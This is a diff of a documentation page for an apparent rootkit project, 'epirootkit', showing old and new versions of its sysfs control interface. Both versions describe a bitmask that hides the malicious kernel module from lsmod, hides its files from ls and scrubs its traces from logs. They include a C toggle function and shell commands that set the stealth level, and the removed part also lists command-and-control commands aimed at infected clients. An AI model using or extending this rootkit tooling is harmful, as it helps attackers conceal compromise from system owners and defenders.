@@ -1,95 +1,57 @@
 ---
 title: "Sysfs Interface"
-description: "Linux sysfs interface with octal permission configuration for rootkit control"
+description: "Linux-native configuration using octal permission system"
 icon: "settings"
 date: "2025-05-30T00:00:00+01:00"
 lastmod: "2025-05-30T00:00:00+01:00"
 draft: false
 toc: true
-weight: 513
+weight: 520
 ---
 
 # Sysfs Interface
 
-Linux sysfs interface for rootkit control using octal permission-style configuration (like Linux file permissions).
+Linux sysfs interface with octal permission-style configuration for rootkit control.
 
 ## Implementation
 
-```c
-/* Octal hide control (like file permissions)
- * 1: Module hidden    2: Files hidden    4: Lines hidden
- * Examples: 0=visible, 1=module, 3=module+files, 7=all hidden */
+Directory: `/sys/kernel/epirootkit/`
 
+Uses an octal bitmask system where each bit controls specific stealth features:
+- Bit 0 (1): Module hiding
+- Bit 1 (2): File hiding  
+- Bit 2 (4): Line hiding
+
+```c
 static void update_hide_state(int mode)
 {
-    /* Module hiding (bit 0) */
-    if (mode & 1) {
-        if (!is_module_hidden()) hide_module();
-    } else {
-        if (is_module_hidden()) unhide_module();
-    }
-    
-    /* File hiding (bit 1) */
-    if (mode & 2) {
-        if (!is_file_hiding_enabled()) enable_file_hiding();
-    } else {
-        if (is_file_hiding_enabled()) disable_file_hiding();
-    }
-    
-    /* Line hiding (bit 2) */
-    if (mode & 4) {
-        if (!is_line_hiding_enabled()) enable_line_hiding();
-    } else {
-        if (is_line_hiding_enabled()) disable_line_hiding();
-    }
+    if (mode & 1) enable_module_hiding();
+    if (mode & 2) enable_file_hiding();
+    if (mode & 4) enable_line_hiding();
 }
 ```
 
-Uses 3-bit octal system (0-7) where each bit controls a stealth feature.
+## Sysfs Files
 
-## Octal Values
-
-| Value | Binary | Module | Files | Lines | Description |
-|:-----:|:------:|:------:|:-----:|:-----:|:------------|
-| `0`   | `000`  | ❌     | ❌    | ❌    | All features disabled - rootkit fully visible |
-| `1`   | `001`  | ✅     | ❌    | ❌    | Hide rootkit module from `lsmod` |
-| `2`   | `010`  | ❌     | ✅    | ❌    | Hide rootkit files from `ls` |
-| `3`   | `011`  | ✅     | ✅    | ❌    | Hide both module and files |
-| `4`   | `100`  | ❌     | ❌    | ✅    | Hide rootkit traces from log files |
-| `5`   | `101`  | ✅     | ❌    | ✅    | Hide module and log traces |
-| `6`   | `110`  | ❌     | ✅    | ✅    | Hide files and log traces |
-| `7`   | `111`  | ✅     | ✅    | ✅    | Maximum stealth - all features enabled |
+**`/sys/kernel/epirootkit/hide`** - Controls stealth features
+**`/sys/kernel/epirootkit/unhide`** - Quick disable all hiding
 
 ## Usage
 
 ```bash
-# Read current state
-cat /sys/kernel/epirootkit/hide
-# Output: Current octal value (0-7)
-
-# Enable maximum stealth (all features)
+# Enable all stealth features (7 = 4+2+1)
 echo 7 > /sys/kernel/epirootkit/hide
 
-# Hide only module and files
+# Enable only module and file hiding (3 = 2+1)
 echo 3 > /sys/kernel/epirootkit/hide
 
 # Disable all hiding
-echo 0 > /sys/kernel/epirootkit/hide
-# Or use quick unhide
 echo 1 > /sys/kernel/epirootkit/unhide
+
+# Check status
+cat /proc/epirootkit_status
 ```
 
-## Control
+## Control Integration
 
-### WebUI
-Configuration controlled via **[Configuration Panel](../../04-web-ui/features/panels/configuration-panel.md)**
-
-### C2 Commands
-```bash
-hide-module Client-1     # Sets bit 0 (echo 1 > hide)
-hide-files Client-1      # Sets bit 1 (echo 2 > hide)  
-hide-lines Client-1      # Sets bit 2 (echo 4 > hide)
-status Client-1          # Shows current hide_mode
-```
-
-Provides Linux-native, permission-style configuration for all stealth features. 
+Works alongside WebUI and C2 commands for unified rootkit management. 
